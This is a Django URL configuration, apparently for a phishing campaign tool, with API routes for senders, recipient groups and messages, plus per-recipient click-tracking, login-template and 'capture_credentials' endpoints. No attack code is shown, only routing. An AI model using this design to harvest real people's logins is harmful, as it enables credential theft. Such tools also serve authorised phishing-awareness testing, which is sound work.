from django.urls import path, include
from rest_framework.routers import DefaultRouter
from .views import SenderViewSet, RecipientGroupViewSet, RecipientViewSet, MessageViewSet
from .views import track_click, capture_credentials, login_template_view

router = DefaultRouter()
router.register(r'senders', SenderViewSet)
router.register(r'recipient_groups', RecipientGroupViewSet)
router.register(r'recipients', RecipientViewSet)
router.register(r'messages', MessageViewSet)

urlpatterns = [
    path('api/', include(router.urls)),  # Для API-эндпоинтов
    path("track/<int:recipient_id>/", track_click, name="track_click"),
    path("capture/<int:recipient_id>/", capture_credentials, name="capture_credentials"),
    path("email-template/<int:recipient_id>/", login_template_view, name="email_template"),
]
